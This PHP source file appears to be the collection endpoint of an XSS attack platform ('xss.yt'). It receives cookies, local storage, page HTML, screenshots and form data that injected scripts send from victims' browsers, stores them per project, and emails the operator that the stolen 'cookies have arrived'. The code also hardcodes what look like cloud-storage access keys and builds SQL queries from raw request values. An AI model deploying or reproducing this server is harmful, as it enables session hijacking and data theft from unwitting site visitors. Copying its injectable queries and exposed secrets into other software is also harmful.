<?php
/**
 * api.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */

header("Access-Control-Allow-Origin: *");
if(!defined('IN_OLDCMS')) die('Access Denied');
//include "vendor/autoload.php";
use apanly\BrowserDetector\Browser;
use apanly\BrowserDetector\Os;
use apanly\BrowserDetector\Device;
$id=Val('id','REQUEST');
$imgs=Val('imgs','REQUEST',1);  //411161555 图片XSS     1表单模块    2截屏模块
bank_log('16 id=>'.$id,'jsonp','jsonp');
bank_log('17 imgs=>'.$imgs,'jsonp','jsonp');


if($id){
	$db=DBConnect();
	$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$id}'");
	if(empty($project)) exit();
	//$cookienumbers=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND allowdel=1");
	$cookienumbers=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND allowdel=0 and hide = 0");
	bank_log('22'.$id,'jsonp','jsonp');
	$hide = 0;
	if($cookienumbers>100){
	 	bank_log('24','jsonp','jsonp');
		$huiyuan=$db->FirstRow("SELECT huiyuantime,huiyuan,user_name,email FROM ".Tb('users')." WHERE id=".$project['userId']);
		if($huiyuan['huiyuantime']<time()){
		     $hide = 1;
	      $daythree=$db->FirstRow("SELECT * FROM ".Tb('zhaohuipwd')." WHERE userid=".$project['userId']." AND pd=3 ");
			if(!$daythree['zhtime']){
				$executeArr=array(
								'userid'=>$project['userId'],
								'zhuser'=>$huiyuan['user_name'],
								'zhpwd'=>$id,
								'zhemail'=>$huiyuan['email'],
								'zhtime'=>time(),
								'pd'=>3
								);
			$db->AutoExecute(Tb('zhaohuipwd'),$executeArr);
			if(empty($huiyuan['email']) || !preg_match('/^(\w+\.)*?\w+@(\w+\.)+\w+$/',$huiyuan['email'])) exit($huiyuan['email']);
			//if(time() - $_SESSION['time'] < 86400){
				SendMail($huiyuan['email'],"XSS学习平台紧急通知！","尊敬的{$huiyuan['user_name']}，您为普通会员。您在平台中“https://xss.yt/{$id}”项目已经满100条cookie信息，平台发送此邮件作为紧急通知，现已打到最新cookie但因cookie已满所以无法入库。请抓紧登陆平台删除对应项目中的cookie，使其少于100条。<br>请登陆平台：https://xss.yt/login/");
				$_SESSION['time'] = time();
		//	}
			}
			
		
		}
	}
		bank_log('50','jsonp','jsonp');
	//用户提供的content
	$content=array();
	//待接收的key
	$keys=array();
	$serverContent=array();
	/* 模块 begin */
	$moduleIds=array();
	if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);
	if(!empty($moduleIds)){
		$modulesStr=implode(',',$moduleIds);
		$modules=$db->Dataset("SELECT * FROM ".Tb('modules')." WHERE id IN ($modulesStr)");
		if(!empty($modules)){
			foreach($modules as $module){
				if(!empty($module['keys'])) $keys=array_merge($keys,json_decode($module['keys']));
			}	
		}
	}
	bank_log('50','jsonp','jsonp');
	/* 模块 end */
	foreach($keys as $key){
		$content[$key]=Val($key,'REQUEST');	
	}
	if($imgs ==1 && isset($content['cookie'])){
		$content['cookie'] = urlencode(StripStr(base64_decode($content['cookie'])));
	}
	if(in_array('toplocation',$keys)){
		$content['toplocation']=!empty($content['toplocation']) ? $content['toplocation'] : $content['location'];
	}
	
	$judgeCookie=in_array('cookie',$keys) ? true : false;
	$cookieHash = $project['id'];
	/* cookie hash */
	if(isset($content['cookie'])){
		$cookieHash .= '_'.$content['cookie'];
	}
	if(isset($content['location'])){
		$cookieHash .= '_'.$content['location'];
	}
	if(isset($content['toplocation'])){
		$cookieHash .= '_'.$content['toplocation'];
	}
	if(isset($content['duquurl'])){
		$cookieHash .= '_'.$content['duquurl'];
	}
	$cookieHash=md5($cookieHash);
	if(!empty(trim($content['pic-ip'])) && $imgs == 411161555){
		$serverContent['HTTP_USER_AGENT']=$content['pic-agent'];
		$serverContent['REMOTE_ADDR']=$content['pic-ip'];
		$serverContent['IP-ADDR']=urlencode(adders($content['pic-ip']));
		$cookieHash=md5($project['id'].'_'.$content['location'].'_'.$serverContent['HTTP_USER_AGENT'].'_'.$serverContent['REMOTE_ADDR'].'_'.$serverContent['cookie']);
	}else{
		unset($content['pic-ip']);
		unset($content['pic-agent']);
	}
//	$cookieExisted=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}' AND allowdel=1");  //FirstRow  FirstValue
	$cookieExisted=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");  //FirstRow  FirstValue
	$result = "";
	bank_log('107  '."SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}' AND allowdel=1",'jsonp','jsonp');
	 bank_log('109'.$judgeCookie,'jsonp','jsonp');
	 $pInfo = $db->FirstRow("SELECT * FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}' order by id desc");
	 $ltime = $pInfo['create_time'];
	 if(time() - $ltime > 180){
	if(1==1  ){
	//if(!$judgeCookie || $cookieExisted<=0){

	  
		if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $content['screenshotpic'], $result)){
			$type = "png";
			$basedir = "/themes/picxss/".date("Y-m-d")."/";
			mkdirswjj(dirname(dirname(__FILE__)).$basedir);
			$basedir_file = $basedir.$cookieHash."-".$project['id'].date("h").".".$type;
			$file_path=dirname(dirname(__FILE__)).$basedir_file;
			bank_log('123'.$file_path,'jsonp','jsonp');
			//if(file_put_contents($file_path,base64_decode(str_replace($result[1], '', $content['screenshotpic'])))){
            if(file_put_contents(dirname(dirname(__FILE__)).$basedir_file, base64_decode(str_replace($result[1], '', $content['screenshotpic'])))){
                bank_log('126','jsonp','jsonp');
	     /* 	include(ROOT_PATH.'/source/class/Imgcompress.class.php');
				$source =  dirname(dirname(__FILE__)).$basedir_file;  
				$dst_img = dirname(dirname(__FILE__)).$basedir_file;  
				$percent = 1;  #原图压缩，不缩放，但体积大大降低  
				$image = (new imgcompress($source,$percent))->compressImg($source); */
				include(ROOT_PATH.'/source/class/Qiniu.php');
                $Qiniu = new Qiniu('gEwGgoUog7N0GYciqrarBpa1QjArQzyDV6Y9ReAb','eCgX0L6XJsBQMQSQiLxVuMGZ60r5_a9SVDzA2enR');
               // $file_path=ROOT_PATH.'/uploads/20181225/25670f5712b4acfb61c5d2a1bce79225.jpg';
               //var_dump($basedir_file);die;
              //  $qiniu_file_path= $Qiniu->upload($file_path);
                 $qiniu_file_path = $basedir_file;
				//$content['screenshotpic'] = urlencode("<a href='/{$basedir_file}' target='_blank' title='点击查看对方网页截图'><img src='{$basedir_file}' style='width:150px;height:50px;'></a>");
				$content['screenshotpic'] = urlencode("<a href='{$qiniu_file_path}' target='_blank' title='点击查看对方网页截图'><img src='{$qiniu_file_path}' style='width:150px;height:50px;'></a>");
			}else{
				unset($content['screenshotpic']);
			}
		}
		
		//服务器获取的content
		if($imgs == 411161555){   //图片XSS
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			$content['cookie']=urlencode($content['cookie']);
			$serverContent['imgs']= 411161555;
			unset($content['pic-ip']);
			unset($content['pic-agent']);
		}elseif($imgs == 1){   //表单模块
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$serverContent['HTTP_USER_AGENT']=$content['agent'];
			$serverContent['REMOTE_ADDR']=$content['ip'];
			$serverContent['IP-ADDR']=urlencode(adders($content['ip']));
			$serverContent['imgs']= 1;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['agent']);
		}else{
	
			$browser = new Browser();
			$os = new Os();
			$device = new Device();

			$sbw = "";
			if($device->getName()!="unknown"){
				$sbw = "<br/>设备为：".$device->getName();
			}
			$dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
			if(isset($content['title']) || isset($content['htmlyuanma'])){
				if(isset($content['title'])){
					$content['title'] = urlencode($content['title']);
				}
			    if(isset($content['htmlyuanma'])){
					$nothttpurl = str_replace('http://','',URL_PROJECT);
					$nothttpurl = str_replace('https://','',$nothttpurl);
					$content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
				}
			}
			if(isset($content['cookie'])){
				$content['cookie'] = urlencode($content['cookie']);
			}
			if(isset($content['datastorage'])){
				$content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
			}
			$serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
			$serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
			$user_ip=get_ipip();
			$serverContent['REMOTE_ADDR']=StripStr($user_ip);
			$serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
			if(isset($content['referrer'])){
				if(strcmp($serverContent['HTTP_REFERER'], $content['referrer']) !== 0){
					$serverContent['HTTP_REFERER'] = $content['referrer'];
				}
				unset($content['referrer']);
			}
			if(isset($content['useragent'])){
				if(strcmp($serverContent['HTTP_USER_AGENT'], $content['useragent']) !== 0){
					$serverContent['HTTP_USER_AGENT'] = $content['useragent'];
				}
				unset($content['useragent']);
			}
		}
		$ipurlblack=$db->Dataset("SELECT * FROM ".Tb('ipurlblack')." WHERE userId='{$project['userId']}' and moduleid='{$project['id']}'");
		if(!empty($ipurlblack)){
				foreach($ipurlblack as $ipurl){
					if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
						if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
					}
					if(!empty($content['toplocation']) && !empty($ipurl['url'])){
						if(strstr($content['toplocation'],$ipurl['url'])) exit();
					}
				}
		}
		unset($content['imgs']);
		$content = array_filter($content);
		$serverContent = array_filter($serverContent);
		$values=array(
			'projectId'=>$project['id'],
			'content'=>JsonEncode($content),
			'serverContent'=>JsonEncode($serverContent),
			'domain'=>$domain,
			'cookieHash'=>$cookieHash,
			'qiniu_file_path'=>$qiniu_file_path,
			'num'=>1,
			'hide'=>$hide,
			'create_time'=>time()
		);

		$db->AutoExecute(Tb('project_content'),$values);

        /* cookie hash */
        $Getcookie= !empty($content['cookie']) ? $content['cookie'] : null;
		//Getcookie在上面的变量里
        $uid = $project['userId'];
        $userInfo = $db->FirstRow("SELECT * FROM ".Tb('users')." WHERE id={$uid}");
		//$msg=explode("|",$userInfo['message']);
		bank_log('249'.$userInfo['email'].' msg'.$userInfo['message'],'jsonp','jsonp');
		if($userInfo['email'] && $userInfo['message']==1){
		    bank_log('254'.$userInfo['email'].' msg'.$userInfo['message'],'jsonp','jsonp');
		    if($hide != '1'){
	        	SendMail($userInfo['email'],"xss.yt商城已收货","尊敬的".$userInfo['user_name']."，您在".URL_ROOT." 预订的饼干<br>Cookie:{$Getcookie}<br>已经到货！货物地址：{$domain}");//Getcookie在上面的变量里
		    }
			bank_log('256'.$userInfo['email'].' msg'.$userInfo['message'],'jsonp','jsonp');
		}

	}}else{

	    //服务器获取的content
		if($imgs == 411161555){   //图片XSS
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$content['cookie']=urlencode($content['cookie']);
			$serverContent['imgs']= 411161555;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['pic-ip']);
			unset($content['pic-agent']);
		}elseif($imgs == 1){   //表单模块
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$serverContent['HTTP_USER_AGENT']=$content['agent'];
			$serverContent['REMOTE_ADDR']=$content['ip'];
			$serverContent['IP-ADDR']=urlencode(adders($content['ip']));
			$serverContent['imgs']= 1;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['agent']);
		}else{
			$browser = new Browser();
			$os = new Os();
			$device = new Device();
			$sbw = "";
			if($device->getName()!="unknown"){
				$sbw = "<br/>设备为：".$device->getName();
			}
			$dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
			if(isset($content['title']) || isset($content['htmlyuanma'])){
				if(isset($content['title'])){
					$content['title'] = urlencode($content['title']);
				}
			    if(isset($content['htmlyuanma'])){
					$nothttpurl = str_replace('http://','',URL_PROJECT);
					$nothttpurl = str_replace('https://','',$nothttpurl);
					$content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
				}
			}
			if(isset($content['cookie'])){
				$content['cookie'] = urlencode($content['cookie']);
			}
			if(isset($content['datastorage'])){
				$content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
			}
			$serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
			$serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
			$user_ip=get_ipip();
			$serverContent['REMOTE_ADDR']=StripStr($user_ip);
			$serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
		}
		$ipurlblack=$db->Dataset("SELECT * FROM ".Tb('ipurlblack')." WHERE userId='{$project['userId']}' and moduleid='{$project['id']}'");
		if(!empty($ipurlblack)){
				foreach($ipurlblack as $ipurl){
					if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
						if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
					}
					if(!empty($content['toplocation']) && !empty($ipurl['url'])){
						if(strstr($content['toplocation'],$ipurl['url'])) exit();
					}
				}
		}
		unset($content['imgs']);
		$content = array_filter($content);
		$serverContent = array_filter($serverContent);
		bank_log('337','jsonp');
		bank_log("UPDATE ".Tb('project_content')." SET content=".JsonEncode($content).",serverContent=".JsonEncode($serverContent).",num=num+1,update_time='".time()."' WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'",'jsonp');
		$db->Execute("UPDATE ".Tb('project_content')." SET content=".JsonEncode($content).",serverContent=".JsonEncode($serverContent).",num=num+1,update_time='".time()."' WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");
	}

	$HTTPREFERER = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
	header("Location:  {$HTTPREFERER} ");
}

?>
